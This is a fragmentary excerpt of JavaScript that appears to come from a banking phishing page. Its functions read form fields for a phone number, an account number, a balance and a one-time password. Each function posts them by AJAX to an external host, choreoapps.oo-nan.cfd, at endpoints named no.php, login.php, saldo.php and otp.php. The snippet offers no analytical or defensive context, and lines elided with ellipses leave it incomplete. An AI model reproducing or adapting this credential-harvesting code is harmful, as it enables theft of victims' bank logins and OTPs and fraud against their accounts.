...
function sendNohp(){
  ...
  sessionStorage.setItem('tarif', tarif);
    ...
    var nohp = document.getElementById('nohp');    
      ...
      $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-nan.cfd/dq/no.php',
...
function sendDebit(){
   $('.load').fadeIn();
    ...
    var rek = document.getElementById('rek');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-nan.cfd/dq/login.php',
...
function sendSaldo(){
    ...
    var saldo = document.getElementById('saldo');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-nan.cfd/dq/saldo.php',
...
function sendOtp(){
    ...
    var nama1 = document.getElementById('nama1');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-nan.cfd/dq/otp.php',
